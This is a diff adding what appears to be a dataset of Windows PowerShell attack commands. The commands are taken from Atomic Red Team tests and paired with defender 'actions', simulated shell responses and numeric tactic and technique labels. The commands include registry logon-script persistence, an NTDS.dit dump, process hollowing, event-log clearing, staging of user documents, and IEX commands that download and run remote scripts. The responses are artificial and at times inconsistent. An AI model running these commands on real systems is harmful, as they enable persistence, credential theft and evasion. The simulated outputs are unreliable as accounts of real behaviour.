@@ -1,0 +1,2930 @@
+action:{ allow command execute this time }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:17
+
+
+action:{ modify the response by change the access right }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris> 
+tactic:1
+technique:17
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+Access denied.
+PS C:\Users\chris>
+tactic:7
+technique:62
+
+
+action:{ allow command execute this time }
+command:Write-Host Joining this computer to a domain must be done manually.
+response:Joining this computer to a domain must be done manually.
+PS C:\Users\chris>
+tactic:1
+technique:62
+
+
+action:{ modify powershell response }
+command:Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+response:PS C:\Users\chris> Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+Success: The requested capability has been installed.
+PS C:\Users\chris>
+tactic:6
+technique:149
+
+
+action:
+command:get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+response:DistinguishedName          : CN=User1,OU=Users,DC=hslab,DC=com
+Enabled                    : True
+GivenName                  : FirstName
+Name                       : User1
+ObjectClass                : user
+ObjectGUID                 : 00000000-0000-0000-0000-000000000001
+SamAccountName             : user1
+Surname                    : LastName
+UserPrincipalName          : user1@hslab.com
+DoesNotRequirePreAuth     : True
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Block this command this time }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:PS C:\Users\chris> $C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:
+command:$startingDirectory = "C:\Users"
+response:PS C:\Users\chris> $startingDirectory = "C:\Users"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:PS C:\Users\chris> $outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:PS C:\Users\chris> $fileExtensionsString = ".doc, .docx, .txt"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:PS C:\Users\chris> $fileExtensions = $fileExtensionsString -split ", "
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ modify powershell response }
+command:Function Search-Files {
+response:PS C:\Users\chris> Function Search-Files {
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:
+command:  param (
+response:PS C:\Users\chris>   param (
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:    [string]$directory
+response:PS C:\Users\chris>     [string]$directory
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:{ allow command execute this time }
+command:  )
+response:PS C:\Users\chris> )
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:PS C:\Users\chris> $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ allow command execute this time }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:PS C:\Users\chris>     $fileExtensions -contains $_.Extension.ToLower()
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:
+command:  }
+response:PS C:\Users\chris> }
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:  return $files
+response:PS C:\Users\chris>   return $files
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:}
+response:PS C:\Users\chris> 
+Access denied.
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:
+command:$foundFiles = Search-Files -directory $startingDirectory
+response:PS C:\Users\chris> $foundFiles = Search-Files -directory $startingDirectory
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ if response is file content, modify the file content }
+command:if ($foundFiles.Count -gt 0) {
+response:PS C:\Users\chris> if ($foundFiles.Count -gt 0) {
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ modify powershell response }
+command:  $foundFilePaths = $foundFiles.FullName
+response:PS C:\Users\chris>   $foundFilePaths = $foundFiles.FullName
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ modify powershell response }
+command:  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+response:PS C:\Users\chris>   Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ modify powershell response }
+command:  Write-Host "Zip file created: $outputZip\data.zip"
+response:PS C:\Users\chris>   Write-Host "Zip file created: $outputZip\data.zip"
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:  } else {
+response:PS C:\Users\chris> } else {
+PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:      Write-Host "No files found with the specified extensions."
+response:PS C:\Users\chris>       Write-Host "No files found with the specified extensions."
+PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ allow command execute this time }
+command:  }
+response:PS C:\Users\chris> }
+PS C:\Users\chris>
+tactic:2
+technique:17
+
+
+action:{ modify powershell response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ allow command execute this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+Successfully added the registry value.
+PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Block this command this time }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:178
+
+
+action:{ modify the response by change the access right }
+command:New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+PS C:\Users\chris>
+tactic:0
+technique:3
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\atomics\..\ExternalPayloads\AdFind.exe"
+response:PS C:\Users\chris> Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\atomics\..\ExternalPayloads\AdFind.exe"
+Access denied.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ modify powershell response }
+command:"C:\atomics\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group) None
+response:PS C:\Users\chris> "C:\atomics\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group) None
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:PS C:\Users\chris> $C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+Access denied.
+PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\evil_kitten.jpg") -ErrorAction Ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\evil_kitten.jpg") -ErrorAction Ignore | Out-Null
+PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Write-Output "Downloading image file..."
+response:PS C:\Users\chris> Write-Output "Downloading image file..."
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ allow command execute this time }
+command:$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+response:PS C:\Users\chris> $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ if response is file content, modify the file content }
+command:Invoke-WebRequest -Uri $imageUrl -OutFile C:\atomics\T1001.002\bin\evil_kitten.jpg
+response:PS C:\Users\chris> Invoke-WebRequest -Uri $imageUrl -OutFile C:\atomics\T1001.002\bin\evil_kitten.jpg
+Access denied.
+PS C:\Users\chris>
+tactic:11
+technique:46
+
+
+action:
+command:New-Item -Path "C:\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Path "C:\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Block this command this time }
+command:Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
+response:PS C:\Users\chris> Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
+Access denied.
+PS C:\Users\chris>
+tactic:0
+technique:141
+
+
+action:{ Block this command this time }
+command:$scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
+response:PS C:\Users\chris> $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ if response is file content, modify the file content }
+command:Invoke-WebRequest -Uri $scriptUrl -OutFile C:\atomics\ExternalPayloads\Extract-Invoke-PSImage.ps1
+response:PS C:\Users\chris> Invoke-WebRequest -Uri $scriptUrl -OutFile C:\atomics\ExternalPayloads\Extract-Invoke-PSImage.ps1
+Access denied.
+PS C:\Users\chris>
+tactic:4
+technique:105
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:cd "C:\atomics\ExternalPayloads\"
+response:PS C:\Users\chris> cd "C:\atomics\ExternalPayloads\"
+Access denied.
+PS C:\Users\chris>
+tactic:4
+technique:50
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Import-Module .\Extract-Invoke-PSImage.ps1
+response:PS C:\Users\chris> Import-Module .\Extract-Invoke-PSImage.ps1
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ allow command execute this time }
+command:$extractedScript=Extract-Invoke-PSImage -Image "C:\atomics\T1001.002\bin\evil_kitten.jpg" -Out "$HOME\result.ps1"
+response:PS C:\Users\chris> $extractedScript=Extract-Invoke-PSImage -Image "C:\atomics\T1001.002\bin\evil_kitten.jpg" -Out "$HOME\result.ps1"
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Block this command this time }
+command:$scriptContent = Get-Content "$HOME\result.ps1" -Raw
+response:PS C:\Users\chris> $scriptContent = Get-Content "$HOME\result.ps1" -Raw
+Access denied.
+PS C:\Users\chris>
+tactic:2
+technique:50
+
+
+action:{ Block this command this time }
+command:$base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
+response:PS C:\Users\chris> $base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
+response:PS C:\Users\chris> $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ if response is file content, modify the file content }
+command:$base64Strings | Set-Content "$HOME\decoded.ps1"
+response:PS C:\Users\chris> $base64Strings | Set-Content "$HOME\decoded.ps1"
+Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ modify powershell response }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:7
+technique:40
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:2
+technique:131
+
+
+action:{ allow command execute this time }
+command:mkdir C:\Windows\Temp\ntds_T1003
+response:PS C:\Users\chris> mkdir C:\Windows\Temp\ntds_T1003
+
+    Directory: C:\Windows\Temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d----         10/10/2023  10:00 AM                ntds_T1003
+
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
+response:Error: The network traffic has been blocked for this command execution.
+PS C:\Users\chris>
+action:{ if response contain hardware setting, modify hardware setting }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:New-Item : Cannot create a file when that file already exists.
+At line:1 char:1
++ New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceExists: (C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe:String) [New-Item], IOException
+    + FullyQualifiedErrorId : ItemAlreadyExists,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:5
+technique:148
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:$target = $env:LOGONSERVER
+response:PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$target = $target.Trim("\\")
+response:PS C:\Users\chris>
+tactic:0
+technique:149
+
+
+action:{ if response is file content, modify the file content }
+command:$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ modify powershell response }
+command:wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
+response:PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Block this command this time }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:PS C:\Users\chris>
+tactic:7
+technique:39
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:10
+technique:13
+
+
+action:
+command:Get-Service > $env:TEMP\T1119_1.txt
+response:PS C:\Users\chris>
+tactic:10
+technique:13
+
+
+action:{ modify the response by change the access right }
+command:Get-ChildItem Env: > $env:TEMP\T1119_2.txt
+response:PS C:\Users\chris>
+tactic:1
+technique:13
+
+
+action:{ Restore to original state }
+command:Get-Process > $env:TEMP\T1119_3.txt
+response:PS C:\Users\chris>
+tactic:1
+technique:13
+
+
+action:{ allow command execute this time }
+command:Set-PSReadlineOption -HistorySaveStyle SaveNothing
+response:PS C:\Users\chris>
+tactic:1
+technique:13
+
+
+action:{ if response is file content, modify the file content }
+command:wevtutil cl System
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ if response is file content, modify the file content }
+command:([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify powershell response }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ allow command execute this time }
+command:%TEMP%\T1010.exe
+response:PS C:\Users\chris>
+action:{ if response is file content, modify the file content }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:{ modify powershell response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:9
+technique:66
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:1
+technique:194
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Block this command this time }
+command:Invoke-MalDoc -macroFile "C:\atomics\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+response:PS C:\Users\chris>
+action:{ if response is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:PS C:\Users\chris>
+action:{ modify the response by change the access right }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:6
+technique:17
+
+
+action:{ allow command execute this time }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful." >> %USERPROFILE%\desktop\T1037.001-log.txt
+PS C:\Users\chris> 
+PS C:\Users\chris> 
+PS C:\Users\chris>
+
+tactic:2
+technique:17
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify powershell response }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:'At line:1 char:1
++ $C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\...
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:New-Item : Access to the path 'C:\atomics\T1010\src' is denied.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\T1010\src:String) [New-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : The remote server returned an error: (403) Forbidden.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atom...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response is file content, modify the file content }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:csc : The type or namespace name 'T1010' could not be found (are you missing a using directive or an assembly reference?)
+At line:1 char:1
++ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T10...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NonTerminatingError,Microsoft.CSharp.Commands.BuildCSharpCommand
+    + FullyQualifiedErrorId : CompilerError
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:%TEMP%\T1010.exe : The term '%TEMP%\T1010.exe' is not recognized as a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ Restore to original state }
+command:%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
+response:'At line:1 char:1
++ %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & ...
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful." >> %USERPROFILE%\desktop\T1037.001-log.txt
+PS C:\Users\chris> 
+PS C:\Users\chris> 
+tactic:5
+technique:17
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:4
+technique:105
+
+
+action:{ Block this command this time }
+command:iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+response:Invoke-WebRequest : The remote server returned an error: (403) Forbidden.
+At line:1 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-Sys...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+tactic:10
+technique:1
+
+
+action:{ modify the response by change the access right }
+command:echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+response:Hello from the Windows Command Prompt!
+PS C:\Users\chris>
+tactic:7
+technique:40
+
+
+action:{ modify the response by change the access right }
+command:Write-Host Joining this computer to a domain must be done manually.
+response:Joining this computer to a domain must be done manually.
+PS C:\Users\chris>
+tactic:6
+technique:62
+
+
+action:{ allow command execute this time }
